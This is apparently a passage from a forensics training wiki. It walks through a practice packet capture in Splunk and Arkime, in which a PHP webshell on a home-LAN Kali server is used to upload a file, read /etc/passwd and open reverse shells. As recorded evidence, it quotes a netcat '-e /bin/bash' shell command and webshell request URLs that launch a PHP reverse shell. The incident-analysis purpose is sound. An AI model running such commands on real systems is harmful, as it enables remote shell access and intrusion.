On Oracle Linux sudo only searches its secure_path, which does not include /usr/local/bin. Use the full path (sudo /usr/local/bin/pcap-ingest …) if you ever need it. But re-ingesting a case re-runs Zeek and Arkime too and can put every log into Splunk and Arkime twice, doubling the counts on this page. snort-test is enough to test a rule.

docs.title: Lessons
docs.text:
1. Baselining notes pay off later. Three unexplained lines (two silent IPs, one odd User-Agent) were the whole infection; each was explained only once later facts arrived.
  2. Busy browsing hides a short attack. 184 destinations; the infection is a handful of hosts in one minute. Remove the known-good (CDN, ads, BITS, CryptoAPI, CNAME to ad platforms) and read what is left.
  3. No DNS + a fixed rhythm = a program. The no-DNS subsearch reduced 184 destinations to the two C2 IPs.
  4. The Referer is the chain. Every malicious request pointed back to the church page.
  5. A new User-Agent = a new program. MSIE 7.0 + UA-CPU 46 s after a download meant the file had run; b= proved it.
  6. Splunk for who/when/how much, Arkime for what exactly. The download URL and the profile data were only in bodies.
  7. Decoders travel with the encoded text. Read the function and translate it, or run it alone in an offline console. Without a decoder, read the shape: character set → layer → crib from the format.
  8. Check the input before blaming the recipe. Quotes, a missing prefix or a cut-off wrap changed every result; ABC and Zeek's body length catch it.
  9. Know your tools' limits. Multi-value host doubled counts; Arkime's 200-packet limit hid c=; re-ingesting would have doubled everything.
  10. Keep data and inference apart. "Timing fits" is inference; "the decoded code says so" is evidence. The report gets evidence.

docs.title: Witty server — Splunk-first baselining to a PHP webshell (minishell.php), a file upload and a reverse shell inside a home LAN
Witty server — PHP webshell, file upload and a reverse shell inside a home LAN
docs.text:
Case summary

A 5-minute practice PCAP from a home network (192.168.1.0/24, no domain), worked Splunk-first with Arkime for packet content. It is not a malware infection: a Windows 10 PC (192.168.1.102) uses a PHP webshell, minishell.php, already sitting on a Kali Linux web server (wittyserver, 192.168.1.100, Apache on port 55555). Through the webshell it uploads cerber4.PNG to /tmp, runs cat /etc/passwd, and starts a PHP reverse shell. The first two tries to 192.168.1.102:4444 fail; the third, to 192.168.1.101:4444, works and gives a shell as www-data for 2 minutes. The page also shows why most internet connections look empty (one-direction capture), why an image on an external site is not C2, and why initial access cannot be seen.

Evidence Practice PCAP, 2017-01-20 09:53:28 – 09:58:40 UTC (about 5 min). Source not recorded Environment Closed network. Splunk with Zeek logs (index=zeek) and Arkime, only this PCAP loaded (no case field or tag needed). No Wireshark. Deliverables Analysis, one Snort rule Related pages BEGUILESOFT — HawkEye over FTP (same baselining method) · Playbook: web shell / server · SPL cheat sheet · Zeek conn.log · Arkime search syntax

How to read this page

Same order as the analysis: baselining → odd signs → HTTP → connections and files → Arkime content → initial access → Snort. New SPL commands and fields are explained where they first appear. The Question boxes are real questions from the session.

The indicators on this page are real

Domains and IPs come from a real capture. Prose and tables are defanged ([.]); code blocks keep values as typed. Do not visit them.

docs.title: Answers at a glance
docs.text: Item Answer Status Network Home LAN 192.168.1.0/24, router 192.168.1.1, ISP DNS 75.75.75.75 / 75.75.76.76 (Comcast). No DHCP, no domain Confirmed Impacted host 192.168.1.100 wittyserver, Kali Linux, Apache/2.4.18 on port 55555, MAC 6c:0b:84:6a:1d:d8 Confirmed Webshell operator 192.168.1.102, Windows 10, Chrome 55, MAC 90:e6:ba:96:43:32 (ASUSTek), possible host name RY4WN-PC Confirmed (host name inferred) Reverse shell listener 192.168.1.101, port 4444 (also runs SSH on 22) Confirmed Webshell /minishell.php, login cookie user=ry4wn, pass = MD5 of password Confirmed Actions Upload cerber4.PNG (real PNG) to /tmp; cat /etc/passwd; reverse shell; ls, id, cd /tmp, nc -nv 192.168.1.100 5555 -e /bin/bash Confirmed Reverse shell to .102:4444 → failed (S0); to .101:4444 → success, 120 s, as www-data Confirmed Root access Not seen Confirmed (in capture) Initial access Not in the capture — minishell.php was already on the server Confirmed (absence)

docs.title: Step 0 — Before the first query
docs.text:
Only this PCAP was ingested, so the pcap_case filter used in other cases is not needed: index=zeek alone is this case. In Arkime no tags == filter is needed either.

  • Time range = All time (the data is from 2017).
  • Splunk time zone = UTC so strftime prints UTC.

docs.title: Step 1 — Baselining
docs.text: The same six queries as the BEGUILESOFT case, without pcap_case. Line-by-line explanations are there; only new parts are explained here.

Reading the baseline:

  • Home network. Internal 192.168.1.0/24, DNS servers 75.75.75.75 / 75.75.76.76 = Comcast (a US home ISP). No DHCP and no Kerberos fit a home LAN without a domain — so there is no user account to find.
  • ry4wn-pc is a host name candidate (a name asked on the LAN). Not confirmed yet.
  • Normal background: 17500 = Dropbox LAN sync, 1900 = SSDP, 5355/WPAD = LLMNR/proxy discovery, 5222/5228 = Google push. Lots of Google/Microsoft 443.
  • Two odd signs: almost every external connection has recv 0, and every DNS answer is empty.
  • Candidates worth a look:
    • www.ajithkp560.aaaaaaaa[.]com at 09:53:39 — 14 HTTP connections to 82.98.86.178 start in the same second.
    • dynupdate.noip[.]com at 09:57:49 → 8.23.224.125 HTTP. No-IP is dynamic DNS; RATs such as njRAT often use it to update their address. 165.254.162.243:8253 at the same second.
    • 52.3.222.186:9339 at 09:53:30 — an unusual port.
    • 173.192.194.69:5938 — TeamViewer's port. Could be legitimate; check.

docs.title: Step 2 — Why are the answers empty? The weird log
docs.text:
index=zeek sourcetype=zeek:weird
| stats count BY name
| sort - count

zeek:weird records traffic that breaks protocol rules. name is the type of oddity.

name                     count
possible_split_routing   41
data_before_established  40
inappropriate_FIN        15
  • possible_split_routing and data_before_established mean Zeek saw only one direction of many connections (for example data without the handshake). inappropriate_FIN has the same cause.
  • In the HTTP log (Step 3) the connections to 192.168.1.100 do have replies (status 200, text/html). So: LAN traffic was captured in both directions, internet traffic only outbound. That explains recv 0 and the empty DNS answers. It is a capture-point property, not malicious behaviour.

Why it matters

Without this check, "sent 5,543, received 0" to 82.98.86.178 could be misread as exfiltration. Always ask whether the capture saw both directions before reading bytes.

docs.title: Step 3 — HTTP: a webshell

| eval time=strftime(ts, "%H:%M:%S")
| table time id_resp_h method host uri status_code user_agent referrer resp_mime_types

  • method GET/POST · host the HTTP Host · uri the path · status_code 200/302/404… · user_agent the program that asked (browser or malware) · referrer the page it came from · resp_mime_types the type Zeek found in the reply content. 09:56:05  192.168.1.100  GET        /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.102&my_port=4444   200   .../minishell.php?rs

09:56:35  192.168.1.100  GET        /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.101&my_port=4444   200   .../minishell.php?rs
